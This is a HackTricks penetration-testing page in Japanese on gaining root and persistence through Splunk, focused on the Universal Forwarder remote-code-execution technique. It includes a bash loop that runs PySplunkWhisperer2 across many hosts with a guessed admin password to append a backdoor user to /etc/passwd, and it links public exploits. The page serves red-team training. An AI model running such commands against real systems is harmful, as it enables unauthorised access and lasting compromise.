# Splunk LPE and Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

もし**内部**または**外部**でマシンを**列挙**しているときに**Splunkが実行中**（ポート8090）で、運が良ければ**有効な認証情報**を知っている場合、**Splunkサービスを悪用**して**シェルを実行**することができます。もしrootが実行している場合、特権をrootに昇格させることができます。

また、もし**すでにrootであり、Splunkサービスがlocalhostのみにリッスンしていない場合**、Splunkサービスから**パスワード**ファイルを**盗み**、パスワードを**クラッキング**したり、新しい認証情報を**追加**したりできます。そして、ホスト上で持続性を維持します。

下の最初の画像では、Splunkdのウェブページがどのように見えるかを示しています。



## Splunk Universal Forwarder Agent Exploit Summary

詳細については、投稿[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を確認してください。これは要約です：

**Exploit Overview:**
Splunk Universal Forwarder Agent（UF）をターゲットにしたエクスプロイトは、エージェントパスワードを持つ攻撃者がエージェントを実行しているシステム上で任意のコードを実行できるようにし、ネットワーク全体を危険にさらす可能性があります。

**Key Points:**
- UFエージェントは、受信接続やコードの真正性を検証しないため、不正なコード実行に対して脆弱です。
- 一般的なパスワード取得方法には、ネットワークディレクトリ、ファイル共有、内部文書での発見が含まれます。
- 成功したエクスプロイトは、侵害されたホストでのSYSTEMまたはrootレベルのアクセス、データの流出、さらなるネットワーク侵入につながる可能性があります。

**Exploit Execution:**
1. 攻撃者がUFエージェントパスワードを取得します。
2. Splunk APIを利用して、エージェントにコマンドやスクリプトを送信します。
3. 可能なアクションには、ファイル抽出、ユーザーアカウント操作、システムの侵害が含まれます。

**Impact:**
- 各ホストでSYSTEM/rootレベルの権限を持つ完全なネットワーク侵害。
- 検出を回避するためのログの無効化の可能性。
- バックドアやランサムウェアのインストール。

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**利用可能な公開エクスプロイト:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunkクエリの悪用

**詳細については、[https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)を確認してください**

{% hint style="success" %}
AWSハッキングを学び、練習する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください!
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。**

</details>
{% endhint %}
